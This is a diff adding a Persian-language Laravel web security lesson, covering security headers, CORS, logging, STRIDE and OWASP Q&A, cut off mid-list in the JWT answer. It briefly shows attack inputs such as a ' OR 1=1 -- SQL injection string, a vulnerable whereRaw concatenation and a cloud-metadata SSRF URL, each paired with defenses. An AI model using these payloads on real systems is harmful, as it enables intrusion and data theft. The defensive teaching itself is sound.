+            $response-&gt;headers-&gt;set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
+        }
+
+        return $response;
+    }
+}
+
+// bootstrap/app.php
+-&gt;withMiddleware(fn (Middleware $m) =&gt; $m-&gt;append(SecurityHeaders::class))</code></pre>
+    <div class="callout tip"><p>HSTS را ابتدا با <code>max-age</code> کوتاه تست کنید؛ با <code>includeSubDomains</code> اگر زیردامنه‌ای HTTPS نداشته باشد از دسترس خارج می‌شود. <code>preload</code> عملاً برگشت‌ناپذیر است. این هدرها را می‌توان در Nginx هم با <code>add_header … always;</code> تنظیم کرد.</p></div>
+
+    <h3>CORS</h3>
+    <p><strong>Same-Origin Policy</strong> (SOP) مرورگر اجازه نمی‌دهد اسکریپت یک origin (scheme + host + port) پاسخ درخواست به origin دیگر را بخواند. <strong>CORS</strong> مکانیزمی است که سرور با آن <strong>به‌صورت کنترل‌شده SOP را شل می‌کند</strong> و به originهای مشخص اجازه خواندن پاسخ را می‌دهد.</p>
+    <ul>
+      <li>برای درخواست‌های غیرساده (متد <code>PUT</code>/<code>DELETE</code>، هدر سفارشی، <code>Content-Type: application/json</code>) مرورگر ابتدا <strong>preflight</strong> با متد <code>OPTIONS</code> می‌فرستد.</li>
+      <li>CORS یک مکانیزم <strong>مرورگر</strong> است؛ curl یا سرور مهاجم آن را رعایت نمی‌کنند. پس CORS <strong>کنترل دسترسی API نیست</strong>؛ authentication و authorization سر جای خودشان لازم‌اند.</li>
+    </ul>
+    <pre><code class="language-php">&lt;?php
+// config/cors.php  (در Laravel 11: php artisan config:publish cors)
+return [
+    'paths' =&gt; ['api/*', 'sanctum/csrf-cookie'],
+    'allowed_methods' =&gt; ['GET', 'POST', 'PUT', 'DELETE'],
+    'allowed_origins' =&gt; ['https://app.example.com'],   // نه '*' برای API با credential
+    'allowed_headers' =&gt; ['Content-Type', 'Authorization', 'X-XSRF-TOKEN'],
+    'supports_credentials' =&gt; true,
+    'max_age' =&gt; 600,
+];</code></pre>
+    <div class="callout warn"><p>اشتباهات خطرناک CORS: (۱) <strong>بازتاب هر Origin</strong> در <code>Access-Control-Allow-Origin</code> همراه با <code>Access-Control-Allow-Credentials: true</code>؛ هر سایتی می‌تواند با کوکی کاربر داده او را بخواند. (۲) اعتماد به <code>Origin: null</code>. (۳) regex ضعیف مثل «شامل <code>example.com</code>» که <code>example.com.evil.net</code> را هم قبول می‌کند. مرورگرها ترکیب <code>*</code> با credentials را رد می‌کنند و همین باعث می‌شود برخی توسعه‌دهندگان به‌اشتباه origin را بازتاب دهند.</p></div>
+    <div class="callout exam"><p>تمایز مهم: <strong>SOP جلوی خواندن پاسخ را می‌گیرد، نه ارسال درخواست را</strong>. به همین دلیل CORS در برابر CSRF محافظت نمی‌کند و CSRF دفاع جداگانه (توکن، SameSite) لازم دارد.</p></div>
+  </section>
+
+  <!-- ============ 13. Logging & monitoring ============ -->
+  <section class="lesson" id="logging-monitoring" data-title="Logging و Monitoring امنیتی">
+    <h2>Logging و Monitoring امنیتی</h2>
+    <p>A09 درباره این است که حمله رخ می‌دهد ولی <strong>کسی متوجه نمی‌شود</strong> یا پس از وقوع، شواهد کافی برای تحلیل وجود ندارد. لاگ بدون monitoring و alert ارزش کمی دارد.</p>
+    <div class="grid-2">
+      <div class="card"><h4>چه چیزی لاگ شود</h4>
+        <ul>
+          <li>لاگین موفق و ناموفق، lockout، logout</li>
+          <li>تغییر رمز، ایمیل، فعال/غیرفعال کردن MFA، reset رمز</li>
+          <li>خطاهای authorization (403) و validation مشکوک</li>
+          <li>عملیات ادمین و تغییر نقش‌ها و مجوزها</li>
+          <li>تراکنش‌های مالی و عملیات حساس کسب‌وکار</li>
+          <li>خطاهای امضا/توکن نامعتبر، rate limit</li>
+        </ul>
+      </div>
+      <div class="card"><h4>چه چیزی لاگ نشود</h4>
+        <ul>
+          <li>رمز عبور (حتی ناموفق)، OTP، توکن، session id، کلید API</li>
+          <li>شماره کارت کامل، داده‌های حساس شخصی (یا mask شوند)</li>
+          <li>بدنه کامل درخواست‌ها بدون فیلتر</li>
+        </ul>
+      </div>
+    </div>
+    <pre><code class="language-php">&lt;?php
+use Illuminate\Auth\Events\Failed;
+use Illuminate\Auth\Events\Lockout;
+
+// Listener برای رویدادهای احراز هویت Laravel
+final class LogFailedLogin
+{
+    public function handle(Failed $event): void
+    {
+        Log::channel('security')-&gt;warning('auth.failed', [
+            'email' =&gt; $event-&gt;credentials['email'] ?? null, // بدون password
+            'ip'    =&gt; request()-&gt;ip(),
+            'ua'    =&gt; request()-&gt;userAgent(),
+        ]);
+    }
+}</code></pre>
+    <ul>
+      <li><strong>Structured logging</strong> (JSON) با context ثابت: user id، IP، request id (correlation id)، زمان دقیق UTC.</li>
+      <li>جلوگیری از <strong>log injection</strong>: ورودی کاربر را در متن پیام concat نکنید؛ در context ساختاریافته بگذارید (CRLF می‌تواند خط لاگ جعلی بسازد).</li>
+      <li><strong>لاگ متمرکز</strong> (ELK/OpenSearch، Loki، SIEM) خارج از سرور اپلیکیشن، تا مهاجم با نفوذ به سرور نتواند آن را پاک کند؛ کنترل دسترسی و retention مشخص.</li>
+      <li><strong>Alerting</strong> روی الگوها: افزایش ناگهانی لاگین ناموفق، 403های پشت‌سرهم از یک کاربر، ورود ادمین از کشور جدید.</li>
+      <li>سیگنال‌های Laravel: <code>Illuminate\Auth\Events\Login</code>، <code>Failed</code>، <code>Lockout</code>، <code>PasswordReset</code>.</li>
+      <li>برنامه <strong>Incident Response</strong>: چه کسی، چه زمانی، چه اقدامی.</li>
+    </ul>
+    <div class="callout exam"><p>تعادل را در پاسخ نشان دهید: لاگ کافی برای <strong>تشخیص و تحلیل (forensics)</strong> و <strong>non-repudiation</strong>، ولی بدون نقض <strong>حریم خصوصی</strong> و بدون تبدیل لاگ به منبع نشت secret. لاگ بدون alert، تشخیص را به هفته‌ها بعد موکول می‌کند.</p></div>
+  </section>
+
+  <!-- ============ 14. Principles & SDLC ============ -->
+  <section class="lesson" id="secure-sdlc" data-title="اصول امنیت، Secure SDLC و STRIDE">
+    <h2>اصول امنیت، Secure SDLC و STRIDE</h2>
+
+    <h3>اصول پایه</h3>
+    <dl class="terms">
+      <dt>CIA Triad</dt><dd>سه هدف امنیت: <strong>Confidentiality</strong> (محرمانگی)، <strong>Integrity</strong> (یکپارچگی)، <strong>Availability</strong> (دسترس‌پذیری).</dd>
+      <dt>Least Privilege</dt><dd>هر کاربر، سرویس، پروسه یا کلید فقط <strong>حداقل دسترسی لازم</strong> برای کارش را داشته باشد، و فقط برای مدت لازم.</dd>
+      <dt>Defense in Depth</dt><dd>چند لایه کنترل مستقل، تا شکست یک لایه به معنای نفوذ کامل نباشد.</dd>
+      <dt>Fail Securely</dt><dd>در صورت خطا، سیستم به حالت امن (deny) برود نه باز (fail-open)؛ خطای سرویس مجوز نباید به «اجازه» منجر شود.</dd>
+      <dt>Secure by Default</dt><dd>پیکربندی پیش‌فرض امن باشد؛ ناامن‌کردن باید آگاهانه و صریح باشد.</dd>
+      <dt>Minimize Attack Surface</dt><dd>endpoint، پورت، پکیج و قابلیت غیرضروری حذف شود.</dd>
+      <dt>Zero Trust</dt><dd>هیچ درخواستی به صرف بودن در شبکه داخلی مورد اعتماد نیست؛ هر درخواست احراز و مجوزسنجی شود.</dd>
+      <dt>Separation of Duties</dt><dd>عملیات حساس به تأیید بیش از یک نقش نیاز داشته باشد.</dd>
+    </dl>
+
+    <h3>Least Privilege در عمل</h3>
+    <ul>
+      <li>کاربر دیتابیس اپ فقط <code>SELECT/INSERT/UPDATE/DELETE</code> روی schema خودش؛ کاربر جدا برای migration.</li>
+      <li>پروسه PHP-FPM با کاربر غیر root؛ فقط <code>storage/</code> و <code>bootstrap/cache</code> قابل نوشتن.</li>
+      <li>کانتینر بدون root؛ IAM role محدود برای bucket مشخص؛ توکن API با <strong>ability/scope</strong> محدود (Sanctum: <code>$user-&gt;createToken('ci', ['orders:read'])</code> و <code>tokenCan()</code>).</li>
+      <li>نقش‌ها در اپ (RBAC) با مجوزهای ریز، نه «ادمین یا هیچ».</li>
+    </ul>
+
+    <h3>Defense in Depth: مثال لایه‌ها برای یک فرم کامنت</h3>
+    <pre class="diagram">WAF / Rate limit ─► HTTPS + HSTS ─► Auth + CSRF token ─► Validation
+   ─► Policy (authorization) ─► Eloquent bindings ─► Output encoding {{ }}
+   ─► CSP header ─► HttpOnly cookie ─► Security logging + alerts</pre>
+
+    <h3>Secure SDLC</h3>
+    <div class="table-wrap"><table>
+      <thead><tr><th>فاز</th><th>فعالیت امنیتی</th></tr></thead>
+      <tbody>
+        <tr><td>نیازمندی</td><td>نیازمندی‌های امنیتی (مرجع: OWASP ASVS)، abuse case، طبقه‌بندی داده</td></tr>
+        <tr><td>طراحی</td><td><strong>Threat modeling</strong> (STRIDE)، بازبینی معماری، انتخاب الگوهای امن</td></tr>
+        <tr><td>پیاده‌سازی</td><td>استانداردهای کدنویسی امن، code review با چک‌لیست امنیتی، <strong>SAST</strong> (تحلیل ایستا، مثل taint analysis در Psalm)</td></tr>
+        <tr><td>تست</td><td><strong>DAST</strong> (مثل OWASP ZAP)، تست‌های امنیتی خودکار (IDOR، authz)، <strong>SCA</strong> (<code>composer audit</code>)، penetration test</td></tr>
+        <tr><td>استقرار</td><td>hardening، مدیریت secret، IaC امن، اسکن image کانتینر</td></tr>
+        <tr><td>نگه‌داری</td><td>monitoring، patch management، incident response، bug bounty</td></tr>
+      </tbody>
+    </table></div>
+    <p>ایده <strong>Shift Left</strong>: هر چه آسیب‌پذیری زودتر (در طراحی و کدنویسی) پیدا شود، رفعش ارزان‌تر است.</p>
+
+    <h3>Threat Modeling و STRIDE</h3>
+    <p>Threat modeling یعنی پاسخ ساختاریافته به چهار سوال: «چه می‌سازیم؟ (معمولاً با Data Flow Diagram و مشخص‌کردن <strong>trust boundary</strong>‌ها) / چه چیزی ممکن است خراب شود؟ / در برابرش چه می‌کنیم؟ / آیا کارمان خوب بود؟». STRIDE (از Microsoft) یک دسته‌بندی برای پیدا کردن تهدیدهاست:</p>
+    <div class="table-wrap"><table>
+      <thead><tr><th>تهدید</th><th>ویژگی نقض‌شده</th><th>مثال</th><th>کنترل</th></tr></thead>
+      <tbody>
+        <tr><td><strong>S</strong>poofing</td><td>Authentication</td><td>جعل هویت کاربر با توکن دزدیده‌شده</td><td>MFA، مدیریت session امن</td></tr>
+        <tr><td><strong>T</strong>ampering</td><td>Integrity</td><td>تغییر قیمت در درخواست یا داده در مسیر</td><td>TLS، امضا/HMAC، بررسی سمت سرور</td></tr>
+        <tr><td><strong>R</strong>epudiation</td><td>Non-repudiation</td><td>کاربر انجام تراکنش را انکار می‌کند</td><td>audit log غیرقابل تغییر، امضای دیجیتال</td></tr>
+        <tr><td><strong>I</strong>nformation Disclosure</td><td>Confidentiality</td><td>نشت داده با IDOR یا صفحه خطای دیباگ</td><td>authorization، رمزنگاری، خطای عمومی</td></tr>
+        <tr><td><strong>D</strong>enial of Service</td><td>Availability</td><td>ارسال هزاران درخواست سنگین</td><td>rate limiting، timeout، صف، autoscaling</td></tr>
+        <tr><td><strong>E</strong>levation of Privilege</td><td>Authorization</td><td>کاربر عادی با mass assignment ادمین می‌شود</td><td>Policy، least privilege، <code>$fillable</code></td></tr>
+      </tbody>
+    </table></div>
+    <div class="callout exam"><p>برای سوال STRIDE، هر حرف را با <strong>ویژگی امنیتی متناظر</strong> و یک کنترل بنویسید (جدول بالا). اشاره به <strong>trust boundary</strong> (مرز بین کلاینت و سرور، بین اپ و دیتابیس، بین سرویس شما و third-party) نشان می‌دهد روش را واقعاً می‌شناسید: تهدیدها معمولاً جایی رخ می‌دهند که داده از یک مرز اعتماد عبور می‌کند.</p></div>
+  </section>
+
+  <!-- ============ Questions ============ -->
+  <section class="lesson" id="questions" data-title="سوالات تشریحی">
+    <h2>سوالات تشریحی</h2>
+
+    <details class="qa" id="q-owasp-security-1">
+      <summary>OWASP Top 10 چیست؟ پنج مورد از آیتم‌های نسخه 2021 را نام برده و هر کدام را با یک مثال و راه مقابله توضیح دهید.</summary>
+      <div class="answer">
+        <p><strong>تعریف:</strong> OWASP Top 10 یک <strong>سند آگاهی‌بخشی</strong> از بنیاد OWASP است که ده <strong>دسته</strong> از مهم‌ترین ریسک‌های امنیتی اپلیکیشن‌های وب را بر اساس داده‌های واقعی و نظرسنجی متخصصان رتبه‌بندی می‌کند. استاندارد کامل نیست (برای آن ASVS وجود دارد) ولی نقطه شروع مشترک تیم‌هاست.</p>
+        <ul>
+          <li><strong>A01 Broken Access Control:</strong> تغییر <code>/orders/15</code> به <code>/orders/16</code> و دیدن سفارش دیگران (IDOR). مقابله: Policy/Gate و scope کردن کوئری به کاربر، deny by default.</li>
+          <li><strong>A02 Cryptographic Failures:</strong> ذخیره رمز با MD5 یا ارسال داده روی HTTP. مقابله: bcrypt/Argon2id، TLS 1.2+ و HSTS، رمزنگاری داده حساس at rest.</li>
+          <li><strong>A03 Injection:</strong> <code>whereRaw("email = '$email'")</code> با ورودی <code>' OR 1=1 --</code>؛ XSS هم اینجاست. مقابله: parameterized query، output encoding.</li>
+          <li><strong>A05 Security Misconfiguration:</strong> <code>APP_DEBUG=true</code> در production یا <code>.env</code> قابل دانلود. مقابله: hardening، document root روی <code>public/</code>، چک‌لیست deploy.</li>
+          <li><strong>A10 SSRF:</strong> قابلیت «دریافت تصویر از URL» که با <code>http://169.254.169.254/</code> به metadata ابری دسترسی پیدا می‌کند. مقابله: allowlist، بلاک IPهای داخلی، غیرفعال‌کردن redirect.</li>
+        </ul>
+        <p><strong>بقیه:</strong> A04 Insecure Design، A06 Vulnerable and Outdated Components، A07 Identification and Authentication Failures، A08 Software and Data Integrity Failures، A09 Security Logging and Monitoring Failures.</p>
+        <p><strong>نکته:</strong> نسخه 2025 هم منتشر شده که در آن SSRF داخل Broken Access Control ادغام شده و دسته‌های Software Supply Chain Failures و Mishandling of Exceptional Conditions اضافه شده‌اند.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-2">
+      <summary>SQL Injection چیست و چرا Prepared Statement از آن جلوگیری می‌کند؟ آیا استفاده از Eloquent به‌تنهایی امنیت کامل در برابر SQLi را تضمین می‌کند؟</summary>
+      <div class="answer">
+        <p><strong>تعریف:</strong> SQLi زمانی رخ می‌دهد که ورودی غیرقابل‌اعتماد با <strong>الحاق رشته</strong> وارد کوئری شود و دیتابیس نتواند <strong>کد</strong> را از <strong>داده</strong> تفکیک کند؛ نتیجه: دور زدن لاگین، خواندن/تغییر/حذف داده، و در مواردی اجرای دستور روی سرور.</p>
+        <p><strong>چرا Prepared Statement کار می‌کند:</strong> ساختار کوئری با placeholder و مقادیر <strong>جداگانه</strong> به دیتابیس ارسال می‌شوند. دیتابیس ابتدا کوئری را parse و برنامه اجرا را ثابت می‌کند و سپس مقدار را فقط به‌عنوان <strong>literal داده</strong> قرار می‌دهد؛ پس هیچ ورودی‌ای نمی‌تواند ساختار کوئری را تغییر دهد. این برخلاف escape کردن است که به charset و درستی تابع escape وابسته است.</p>
+        <p><strong>Eloquent:</strong> متدهای عادی (<code>where</code>، <code>find</code>، <code>create</code>) به‌صورت خودکار از PDO binding استفاده می‌کنند، ولی امنیت کامل <strong>تضمین نمی‌شود</strong>:</p>
+        <ul>
+          <li>متدهای raw (<code>whereRaw</code>، <code>selectRaw</code>، <code>orderByRaw</code>، <code>DB::raw</code>، <code>DB::statement</code>، <code>DB::unprepared</code>) اگر رشته با ورودی ساخته شود، آسیب‌پذیرند. راه‌حل: آرگومان bindings، مثل <code>whereRaw('price &gt; ?', [$min])</code>.</li>
+          <li><strong>نام ستون و جهت sort</strong> قابل bind نیستند؛ <code>orderBy($request-&gt;sort)</code> باید با <strong>allowlist</strong> کنترل شود.</li>
+        </ul>
+        <pre><code class="language-php">&lt;?php
+$col = in_array($request-&gt;sort, ['price', 'created_at'], true) ? $request-&gt;sort : 'created_at';
+Product::where('category_id', $request-&gt;category)-&gt;orderBy($col)-&gt;get();</code></pre>
+        <p><strong>دفاع چندلایه:</strong> کاربر DB با حداقل دسترسی، خاموش بودن نمایش خطا، validation نوع ورودی، و WAF به‌عنوان لایه اضافه.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-3">
+      <summary>انواع XSS را تعریف و مقایسه کنید. تفاوت <code>{{ }}</code> و <code>{!! !!}</code> در Blade چیست و آیا <code>{{ }}</code> همه حالت‌ها را پوشش می‌دهد؟</summary>
+      <div class="answer">
+        <p><strong>تعریف:</strong> XSS تزریق اسکریپت به صفحه‌ای است که مرورگر قربانی آن را از origin سایت معتبر می‌داند؛ اسکریپت با دسترسی کامل سایت اجرا می‌شود (سرقت توکن، ارسال درخواست از طرف کاربر، تغییر صفحه).</p>
+        <ul>
+          <li><strong>Stored:</strong> payload در DB ذخیره می‌شود (کامنت، نام کاربری) و به همه نمایش داده می‌شود؛ خطرناک‌ترین چون قربانی‌ها زیادند.</li>
+          <li><strong>Reflected:</strong> payload در URL است و سرور آن را بی‌درنگ در پاسخ بازتاب می‌دهد؛ نیاز به فریب کاربر برای کلیک روی لینک.</li>
+          <li><strong>DOM-based:</strong> کاملاً سمت کلاینت؛ JS داده را از source ناامن (<code>location.hash</code>) به sink خطرناک (<code>innerHTML</code>، <code>eval</code>) می‌برد و ممکن است اصلاً به سرور نرسد.</li>
+        </ul>
+        <p><strong>Blade:</strong> <code>{{ $x }}</code> خروجی را با <code>htmlspecialchars</code> (با <code>ENT_QUOTES</code> و UTF-8) escape می‌کند؛ <code>{!! $x !!}</code> خروجی <strong>خام</strong> است و فقط برای HTML مورد اعتماد یا sanitize‌شده با کتابخانه allowlist (مثل HTML Purifier) مجاز است.</p>
+        <p><strong>محدودیت‌های <code>{{ }}</code>:</strong></p>
+        <ul>
+          <li>در <code>href</code>، URL با scheme <code>javascript:</code> را متوقف نمی‌کند؛ scheme را validate کنید.</li>
+          <li>داخل <code>&lt;script&gt;</code> context جاوااسکریپت است؛ از <code>@js()</code> یا <code>Js::from()</code> استفاده کنید.</li>
+          <li>در attribute بدون کوتیشن یا داخل event handler (<code>onclick</code>) ناکافی است.</li>
+          <li>DOM XSS در JS فرانت را پوشش نمی‌دهد.</li>
+        </ul>
+        <p><strong>لایه‌های تکمیلی:</strong> CSP بدون <code>unsafe-inline</code> (با nonce)، کوکی HttpOnly، validation ورودی. اصل کلیدی: <strong>context-aware output encoding در زمان خروجی</strong>.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-4">
+      <summary>CSRF چیست و چه شرایطی برای وقوع آن لازم است؟ Laravel چگونه از آن جلوگیری می‌کند و نقش SameSite cookie چیست؟</summary>
+      <div class="answer">
+        <p><strong>تعریف:</strong> حمله‌ای که در آن سایت مهاجم مرورگر کاربرِ لاگین‌کرده را وادار به ارسال درخواست <strong>تغییردهنده وضعیت</strong> به سایت هدف می‌کند؛ چون مرورگر کوکی‌ها را خودکار ضمیمه می‌کند، سرور درخواست را مشروع می‌پندارد. مهاجم پاسخ را نمی‌بیند؛ هدفش اثر جانبی است.</p>
+        <p><strong>شرایط:</strong> (۱) احراز هویت مبتنی بر credential خودکار مرورگر (کوکی)، (۲) عملیات حساس با پارامترهای قابل پیش‌بینی، (۳) نبود توکن غیرقابل‌حدس. به همین دلیل APIهایی که با هدر <code>Authorization: Bearer</code> کار می‌کنند ذاتاً مستعد CSRF نیستند.</p>
+        <p><strong>Laravel:</strong></p>
+        <ul>
+          <li>middleware <code>ValidateCsrfToken</code> در گروه <code>web</code> برای متدهای POST/PUT/PATCH/DELETE توکن session را با <code>_token</code> فرم (<code>@csrf</code>) یا هدر <code>X-CSRF-TOKEN</code>/<code>X-XSRF-TOKEN</code> مقایسه می‌کند؛ عدم تطابق = خطای 419.</li>
+          <li>کوکی <code>XSRF-TOKEN</code> برای کتابخانه‌هایی مثل Axios که خودکار آن را در هدر برمی‌گردانند.</li>
+          <li>webhookها با <code>validateCsrfTokens(except: [...])</code> مستثنی و با امضای HMAC احراز می‌شوند.</li>
+        </ul>
+        <p><strong>SameSite:</strong> <code>Lax</code> (پیش‌فرض Laravel) کوکی را در درخواست‌های cross-site فقط برای navigation سطح بالا با GET می‌فرستد؛ پس فرم POST مهاجم بدون کوکی می‌رسد. <code>Strict</code> هیچ‌وقت. ولی SameSite جایگزین کامل توکن نیست: GETهای تغییردهنده وضعیت، زیردامنه‌های same-site و مرورگرهای قدیمی. پس <strong>توکن + SameSite + GET امن</strong>.</p>
+        <p><strong>نکته:</strong> CORS در برابر CSRF محافظت نمی‌کند، چون درخواست ساده بدون preflight اجرا می‌شود.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-5">
+      <summary>کد زیر چه مشکل امنیتی دارد و چگونه آن را اصلاح می‌کنید؟
+        <code>Route::get('/api/orders/{id}', fn ($id) =&gt; Order::find($id))-&gt;middleware('auth:sanctum');</code></summary>
+      <div class="answer">
+        <p><strong>مشکل اصلی: IDOR (Broken Access Control، A01).</strong> کد فقط احراز هویت را بررسی می‌کند، نه مجوز؛ هر کاربر لاگین‌کرده با تغییر <code>id</code> سفارش‌های همه کاربران را می‌بیند. id عددی ترتیبی، enumeration را هم ساده می‌کند.</p>
+        <p><strong>مشکلات فرعی:</strong></p>
+        <ul>
+          <li>برگرداندن مستقیم مدل: همه ستون‌ها (شاید فیلدهای داخلی یا حساس) در JSON سریال می‌شوند (Excessive Data Exposure).</li>
+          <li><code>find</code> در صورت نبودن، <code>null</code> با کد 200 برمی‌گرداند.</li>
+          <li>نبود rate limit برای جلوگیری از enumeration گسترده.</li>
+        </ul>
+        <pre><code class="language-php">&lt;?php
+// Policy
+public function view(User $user, Order $order): Response
+{
+    return $order-&gt;user_id === $user-&gt;id
+        ? Response::allow()
+        : Response::denyAsNotFound();
+}
+
+// Route + Controller
+Route::middleware(['auth:sanctum', 'throttle:api'])
+    -&gt;get('/api/orders/{order}', [OrderController::class, 'show']);
+
+public function show(Order $order): OrderResource
+{
+    Gate::authorize('view', $order);
+    return new OrderResource($order); // فقط فیلدهای مجاز
+}
+
+// جایگزین: scope کردن کوئری به کاربر
+$order = $request-&gt;user()-&gt;orders()-&gt;findOrFail($id);</code></pre>
+        <p><strong>تکمیلی:</strong> استفاده از ULID/UUID حدس‌زدن را سخت می‌کند ولی جایگزین authorization نیست؛ تست خودکار منفی («کاربر B نباید سفارش A را ببیند») اضافه شود.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-6">
+      <summary>رمزهای عبور را چگونه باید ذخیره کرد؟ چرا MD5 و SHA-1 (و حتی SHA-256) مناسب نیستند؟ Salt و Pepper را توضیح دهید.</summary>
+      <div class="answer">
+        <p><strong>اصل:</strong> رمز عبور باید با یک <strong>تابع هش مخصوص رمز</strong> که <strong>عمداً کند</strong>، <strong>salted</strong> و قابل تنظیم (work factor) است ذخیره شود: <strong>Argon2id</strong> (توصیه مدرن، memory-hard) یا <strong>bcrypt</strong> (پیش‌فرض Laravel). هرگز متن ساده یا رمزنگاری برگشت‌پذیر.</p>
+        <p><strong>چرا MD5/SHA مناسب نیستند:</strong></p>
+        <ul>
+          <li>برای <strong>سرعت</strong> طراحی شده‌اند؛ GPU میلیاردها هش در ثانیه محاسبه می‌کند، پس پس از نشت DB، brute force و dictionary attack آفلاین ارزان است.</li>
+          <li>بدون salt، با <strong>rainbow table</strong> شکسته می‌شوند و رمزهای یکسان هش یکسان دارند.</li>
+          <li>MD5 و SHA-1 علاوه بر این از نظر collision هم شکسته شده‌اند. SHA-256 برای integrity امن است ولی برای رمز چون سریع است مناسب نیست.</li>
+        </ul>
+        <p><strong>Salt:</strong> مقدار تصادفی یکتا برای هر رمز که کنار هش ذخیره می‌شود (مخفی نیست)؛ rainbow table را بی‌اثر می‌کند و حمله را مجبور می‌کند برای هر کاربر جداگانه انجام شود. bcrypt و Argon2 خودکار salt می‌سازند و در خروجی قرار می‌دهند.</p>
+        <p><strong>Pepper:</strong> راز سراسری <strong>خارج از دیتابیس</strong> (مثلاً در secret manager) که به محاسبه اضافه می‌شود؛ اگر فقط DB نشت کند، هش‌ها قابل حمله نیستند. اختیاری است و چرخش آن دشوار.</p>
+        <pre><code class="language-php">&lt;?php
+$user-&gt;password = Hash::make($request-&gt;password);   // یا cast 'hashed'
+Hash::check($request-&gt;password, $user-&gt;password);  // مقایسه امن
+Hash::needsRehash($user-&gt;password);                // ارتقای cost</code></pre>
+        <p><strong>تکمیلی:</strong> سیاست طول حداقلی، بررسی رمزهای لو رفته (<code>Password::uncompromised()</code>)، rate limit و MFA.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-7">
+      <summary>Session Fixation و Session Hijacking را توضیح دهید و راه‌های جلوگیری از آنها در Laravel را بنویسید.</summary>
+      <div class="answer">
+        <p><strong>Session Fixation:</strong> مهاجم یک session id معلوم (که خودش گرفته) را به قربانی تحمیل می‌کند (مثلاً از طریق لینک یا زیردامنه‌ای که کوکی تنظیم می‌کند). اگر سرور پس از لاگین همان id را نگه دارد، مهاجم با آن id به‌عنوان قربانی وارد می‌شود.</p>
+        <p><strong>مقابله:</strong> <strong>تولید session id جدید</strong> پس از لاگین و هر تغییر سطح دسترسی؛ پذیرفتن session id فقط از کوکی (نه URL).</p>
+        <pre><code class="language-php">&lt;?php
+if (Auth::attempt($credentials)) {
+    $request-&gt;session()-&gt;regenerate();
+    return redirect()-&gt;intended('dashboard');
+}
+
+// Logout
+Auth::logout();
+$request-&gt;session()-&gt;invalidate();
+$request-&gt;session()-&gt;regenerateToken();</code></pre>
+        <p><strong>Session Hijacking:</strong> سرقت session id معتبر از طریق XSS، شنود ترافیک HTTP، malware یا لاگ‌شدن id.</p>
+        <p><strong>مقابله:</strong></p>
+        <ul>
+          <li>کوکی <strong>HttpOnly</strong> (عدم دسترسی JS)، <strong>Secure</strong> (فقط HTTPS)، <strong>SameSite</strong>؛ در <code>config/session.php</code>.</li>
+          <li>HTTPS همه‌جا + HSTS.</li>
+          <li>انقضای بی‌فعالیتی (<code>lifetime</code>) و انقضای مطلق برای عملیات حساس.</li>
+          <li>جلوگیری از XSS (ریشه رایج سرقت).</li>
+          <li>نمایش و امکان قطع sessionهای فعال؛ <code>Auth::logoutOtherDevices($password)</code> پس از تغییر رمز.</li>
+          <li>احراز هویت مجدد برای عملیات حساس (middleware <code>password.confirm</code>).</li>
+        </ul>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-8">
+      <summary>سایت شما با حمله Credential Stuffing روی صفحه لاگین مواجه شده است. چه اقداماتی انجام می‌دهید؟</summary>
+      <div class="answer">
+        <p><strong>تعریف:</strong> مهاجم لیست بزرگی از ترکیب ایمیل/رمز لو رفته از سایت‌های دیگر را به‌صورت خودکار امتحان می‌کند، با تکیه بر استفاده مجدد کاربران از رمز. معمولاً از IPهای متعدد (botnet) انجام می‌شود، پس محدودیت فقط بر اساس IP کافی نیست.</p>
+        <p><strong>اقدامات فوری:</strong></p>
+        <ul>
+          <li><strong>Rate limiting چندبعدی</strong>: بر اساس ایمیل + IP و همچنین فقط IP و فقط ایمیل (<code>RateLimiter::for('login', …)</code> و <code>throttle:login</code>).</li>
+          <li><strong>CAPTCHA</strong> پس از چند تلاش ناموفق یا هنگام ترافیک مشکوک.</li>
+          <li>بررسی لاگ‌ها برای شناسایی حساب‌هایی که لاگین موفق داشته‌اند؛ <strong>اجبار به تغییر رمز</strong> و قطع sessionهای آنها.</li>
+          <li>مسدودسازی موقت در لایه WAF/CDN برای الگوهای bot.</li>
+        </ul>
+        <p><strong>اقدامات ساختاری:</strong></p>
+        <ul>
+          <li><strong>MFA</strong> (حداقل برای حساب‌های حساس)؛ مؤثرترین دفاع.</li>
+          <li>رد رمزهای لو رفته هنگام ثبت‌نام و تغییر رمز: <code>Password::min(12)-&gt;uncompromised()</code>.</li>
+          <li>پیام خطای عمومی و زمان پاسخ یکسان (جلوگیری از user enumeration).</li>
+          <li>اطلاع‌رسانی به کاربر درباره لاگین از دستگاه/مکان جدید.</li>
+          <li><strong>Monitoring و alert</strong> روی نرخ <code>Failed</code> events و lockoutها (A09).</li>
+        </ul>
+        <p><strong>نکته:</strong> lockout دائمی حساب پس از چند شکست می‌تواند خودش ابزار DoS علیه کاربران شود؛ lockout <strong>موقت و تدریجی</strong> بهتر است.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-9">
+      <summary>مزایا و ریسک‌های امنیتی JWT را بیان کنید. چه اشتباهاتی در پیاده‌سازی JWT رایج است؟</summary>
+      <div class="answer">
+        <p><strong>تعریف:</strong> JWT توکن خودبسنده با ساختار <code>header.payload.signature</code> (هر بخش Base64URL) است. امضا (HS256 با کلید مشترک یا RS256/ES256 با جفت‌کلید) یکپارچگی و اصالت را تضمین می‌کند؛ payload <strong>رمزنگاری نشده</strong> است.</p>
+        <p><strong>مزایا:</strong> stateless، بررسی بدون lookup دیتابیس، مناسب سیستم‌های توزیع‌شده، SSO و ارتباط سرویس‌به‌سرویس؛ با امضای نامتقارن، سرویس‌ها فقط کلید عمومی لازم دارند.</p>
+        <p><strong>اشتباهات رایج:</strong></p>
+        <ul>
+          <li>پذیرش <code>alg: none</code> یا اعتماد به <code>alg</code> داخل توکن؛ و <strong>algorithm confusion</strong> (RS256 ← HS256 با کلید عمومی به‌عنوان secret). الگوریتم باید سمت سرور ثابت باشد.</li>
+          <li>secret ضعیف HS256 قابل brute force آفلاین.</li>
+          <li>نبود <code>exp</code> یا عمر طولانی؛ بررسی‌نکردن <code>iss</code> و <code>aud</code>.</li>
+          <li>داده حساس در payload.</li>
+          <li>ذخیره در <code>localStorage</code> که با XSS سرقت می‌شود.</li>
